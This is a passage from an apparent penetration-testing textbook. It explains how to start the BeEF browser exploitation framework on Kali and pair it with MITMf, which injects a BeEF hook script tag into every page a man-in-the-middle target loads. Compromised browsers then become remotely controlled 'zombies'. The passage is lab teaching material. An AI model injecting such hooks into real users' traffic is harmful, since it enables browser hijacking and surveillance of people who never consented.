  md: 'We have seen how to perform Man-in-the-Middle attacks and basic manipulation
    with MITMf. Next we will walk through an injection-based attack using the MITMF
    and the Browser Exploitation Framework.


    # The Browser Exploitation Framework (BeEF)


    **Tool Author:** Wade Alcorn


    **Tool Website:** https://beefproject.com/


    Man-in-the-Middle attacks are very useful, but sometimes you want to be able to
    insert or inject HTML, scripts, or code into the data stream. So that, as the
    target system surfs, data that we control is added to what they are receiving.
    There are a couple different ways to do injection-based attacks using the MITMf,
    let''s take a quick look at the JS injection attack with the Browser Exploitation
    Framework or "BeEF".


    BeEF is a penetration testing tool that allows you to run a variety of attacks
    against a target''s web browser. It works by "hooking" targets and then allowing
    you to send commands directly to the computer through the browser. This is accomplished
    through a graphical user interface. The best way to learn how to use BeEF to get
    hands on, let''s get to it. In this section we will use the MITMf to automatically
    inject the BeEF "hook" into our target. We will then use BeEF''s graphical user
    interface to control and send commands to the system.


    **On your Kali VM:**


    Start BeEF from the Kali menu -> 08-Exploitation Tools> beef xss framework


    ```

    Please wait for the BeEF service to start.

    You might need to refresh your browser once it opens.

    Web UI: http://127.0.0.1:3000/ui/panel

    Hook: <script src="http://IP:3000/hook.js"></script>

    Example: <script src="http://127.0.0.1:3000/hook.js"></script>

    ```


    The Browser Exploitation Framework will load and start several webpages, including
    the web user interface.


    Leave this terminal window running and go to the open Internet browser Login with
    the username & password of "beef":'
  merge: -1
  pgno: 203
- img_proc: true
  md: '![](img/37a3b7ef116f9ef991f9e33dd8b348c7_204_0.png)


    You will then be presented with the BeEF control panel:


    ![](img/37a3b7ef116f9ef991f9e33dd8b348c7_204_1.png)


    | Hooked Browsers | Getting Started |

    | :--- | :--- |

    | ☐ Online Browsers | |

    | ☐ Offline Browsers | |


    BeEF works by hooking target browsers which are then called “Zombies”. A hooked
    browser is one that has run the BeEF attack script code and can be controlled
    or manipulated through the BeEF control panel. Usually the target needs to directly
    visit one of the BeEF demo scripts to become hooked. But when we combine BeEF
    with the MITMF Inject attack, MITMF injects the BeEF hook script into every page
